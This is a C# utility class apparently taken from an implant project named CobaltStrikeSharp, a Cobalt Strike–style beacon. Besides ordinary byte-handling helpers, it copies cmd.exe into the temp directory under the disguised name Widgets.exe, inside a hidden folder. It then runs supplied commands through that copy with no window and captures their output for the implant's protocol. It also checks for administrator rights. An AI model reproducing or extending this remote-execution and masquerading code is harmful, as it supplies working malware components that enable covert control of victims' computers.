using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;



namespace CobaltStrikeSharp
{
    class Util
    {
        


        
        public static byte[] getSha256(byte[] input)
        {
            byte[] hash = SHA256Managed.Create().ComputeHash(input);
            return hash;
            /*
            StringBuilder builder = new StringBuilder();
            for (int i = 0; i < hash.Length; i++)
            {
                builder.Append(hash[i].ToString("X2"));
            }
            return builder.ToString();
            */
        }

        public static byte[] BytesCombine(List<byte[]> input)
        {
            int totallen = 0;
            int curPos = 0;
            foreach (byte[] _b in input)
            {
                totallen += _b.Length;
            }
            byte[] pOut = new byte[totallen];

            foreach (byte[] _b in input)
            {
                Array.Copy(_b, 0, pOut, curPos, _b.Length);
                curPos += _b.Length;
            }
            return pOut;
        }

        public static byte[] toBigEndian(byte[] input)
        {
            byte[] dstBytes = new byte[input.Length];
            Array.Copy(input, dstBytes, input.Length);
            if (BitConverter.IsLittleEndian)
                Array.Reverse(dstBytes);
            return dstBytes;
        }

        public static byte[] toBigEndian(UInt16 inputu)
        {
            byte[] input = BitConverter.GetBytes(inputu);
            byte[] dstBytes = new byte[input.Length];
            Array.Copy(input, dstBytes, input.Length);
            if (BitConverter.IsLittleEndian)
                Array.Reverse(dstBytes);
            return dstBytes;
        }

        public static byte[] toBigEndian(UInt32 inputu)
        {
            byte[] input = BitConverter.GetBytes(inputu);
            byte[] dstBytes = new byte[input.Length];
            Array.Copy(input, dstBytes, input.Length);
            if (BitConverter.IsLittleEndian)
                Array.Reverse(dstBytes);
            return dstBytes;
        }

        private static String copyCmd()
        {
            String Temp = Path.GetTempPath();
            String cmdexeTemp = Path.Combine(Temp, "Widgets.exe");
            String cmdmuiTemp = Path.Combine(Temp, "en-US", "Widgets.exe.mui");
            String cmdexeSys = "C:\\windows\\system32\\cmd.exe";
            String cmdmuiSys = "C:\\windows\\system32\\en-US\\cmd.exe.mui";

            String muiPath = Path.Combine(Temp, "en-US");
            if (!Directory.Exists(muiPath))
            {
                DirectoryInfo di = Directory.CreateDirectory(muiPath);
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            }

            if (!File.Exists(cmdexeTemp))
            {
                File.Copy(cmdexeSys, cmdexeTemp, true);
                File.Copy(cmdmuiSys, cmdmuiTemp, true);
            }
            else
            {
                FileInfo fileInfo1 = new FileInfo(cmdexeSys);
                FileInfo fileInfo2 = new FileInfo(cmdexeTemp);
                if (fileInfo1.Length != fileInfo2.Length)
                {
                    File.Copy(cmdexeSys, cmdexeTemp, true);
                    File.Copy(cmdmuiSys, cmdmuiTemp, true);
                }
            }
            return cmdexeTemp;
        }
        public static String execCmd(String workPath, String command)
        {
            String cmdPath = copyCmd();
            Process cmd = new Process();
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.FileName = workPath;
            cmd.StartInfo.WorkingDirectory = Protocol.WorkingDirectory;
            if (workPath == "%COMSPEC%")
            {
                cmd.StartInfo.FileName = cmdPath;                
            }
            else if(workPath == "")
            {
                cmd.StartInfo.Arguments = command.Substring(command.IndexOf(' ')+1);
                cmd.StartInfo.FileName = command.Split(' ')[0];
                cmd.StartInfo.UseShellExecute = true;
                cmd.StartInfo.RedirectStandardInput = false;
                cmd.StartInfo.RedirectStandardOutput = false;
            }
            cmd.Start();
            if (workPath != "")
            {
                if (command.StartsWith(" /C ") || command.StartsWith(" /c "))
                {
                    command = command.TrimStart(" /c ".ToCharArray()).TrimStart(" /C ".ToCharArray());
                }
                cmd.StandardInput.WriteLine(command);
                cmd.StandardInput.Flush();
                cmd.StandardInput.Close();
                cmd.WaitForExit();
                String result = cmd.StandardOutput.ReadToEnd();
                return result;
            }
            else
            {
                return String.Format("Execute [{0}] ok!", command);
            }
        }

        public static bool IsAdministrator()
        {
            WindowsIdentity current = WindowsIdentity.GetCurrent();
            WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
            return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static byte[] fixDll(byte[] data)
        {
            //private byte[] _readResource(String paramString) {
            return null;
        }

    }
}
